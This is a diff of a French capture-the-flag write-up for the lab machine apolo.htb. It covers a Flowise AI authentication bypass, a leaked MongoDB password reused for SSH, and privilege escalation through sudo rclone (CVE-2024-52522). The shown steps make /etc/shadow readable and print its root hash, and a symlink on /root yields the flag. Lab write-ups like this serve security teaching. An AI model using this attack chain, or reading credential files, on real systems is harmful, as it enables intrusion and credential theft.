@@ -11,9 +11,9 @@ category:
 
 # Découverte du challenge
 
-Sur l'ip, nmap retourne deux services: ssh et http.
+Sur la machine, nmap trouve deux services: ssh et http.
 
-On trouve un site web: http://apolo.htb/
+Un site web: http://apolo.htb/
 En creusent un peu, on tombe sur un sous domaine : ai.apolo.htb
 
 Ce sous domain héberge une instance de "Flowise AI". 
@@ -42,7 +42,7 @@ endpoints to uppercase like /API/V1 can bypass the authentication.
 ```
 
 En utilisant cette vulnérabilité, on peut se connecter sur l'instance.
-Dans la partie "Credentials", on retrouve les identifiants utilisée pour se connecter à la base de donnée du serveur. 
+Dans la partie "Credentials", on retrouve les identifiants utilisées pour se connecter à la base de donnée du serveur. 
 
 ```
 mongodb+srv://lewis:C0mpl3xi3Ty!_W1n3@cluster0.mongodb.net/myDatabase?retryWrites=true&w=majority
@@ -50,7 +50,7 @@ mongodb+srv://lewis:C0mpl3xi3Ty!_W1n3@cluster0.mongodb.net/myDatabase?retryWrite
 On essaie de se connecter à la machine via ssh sur l'utilisateur lewis et le mot de passe C0mpl3xi3Ty!_W1n3, et ça passe! 
 
 # Privilege escalation (CVE-2024-52522)
-En listant les doits de l'utilisateur lewis, on peut voir que : 
+En listant les droits de l'utilisateur lewis, on peut voir que : 
 ```
 $ sudo -l
 Matching Defaults entries for lewis on apolo:
@@ -59,9 +59,9 @@ Matching Defaults entries for lewis on apolo:
 User lewis may run the following commands on apolo:
     (ALL : ALL) NOPASSWD: /usr/bin/rclone
 ```
-On peut utiliser la commande /usr/bin/rclone en tant qu'utilisateur.
+On peut utiliser la commande /usr/bin/rclone en tant que root.
 
-Ce programme importe une vulnérabilité modifiant permettant d'avoir une lecture arbitraire sur le fichier/répertoire de notre choix.
+Ce programme importe une vulnérabilité permettant d'avoir une lecture arbitraire sur le fichier/répertoire de notre choix.
 
 Typiquement, voici un test pour vérifier que la vuln fonctionne : 
 ```
@@ -71,8 +71,8 @@ lewis@apolo:~$ ls -la /etc/shadow
 -rwxrwxrwx 1 lewis lewis 1214 Dec  4 13:10 /etc/shadow
 ```
 
-On peut voir que le fichier /etc/shadow appartient maintenant à notre utilisateur ! 
-Ce qui nous permet de lire le fichier
+On peut voir que les droits du fichier /etc/shadow ont été écrasés par ceux de lewis ! 
+Ce qui nous permet de lire le fichier en tant que lewis
 ```
 lewis@apolo:~$ cat /etc/shadow
 root:$6$tXGOWajYaarOSaBl$3ERntPuO48c8RpGIPf/qrfLqezppfW/t0wqRTpzjmaBLYLVWBj.TrLkgJdVKdQeh2cjoBwQ6dVU98ckLQgCCG0:20024:0:99999:7:::
@@ -113,7 +113,7 @@ fwupd-refresh:*:20041:0:99999:7:::
 _laurel:!:20061::::::
 ``` 
 
-De la même manière, on peut faire un lien symbolique avec /root pour obtenir les droits sur ce répertoire
+De la même manière, on peut faire un lien symbolique avec /root pour obtenir les droits sur ce répertoire, et ainsi obtenir le flag root.
 
 # Résultat
 ```
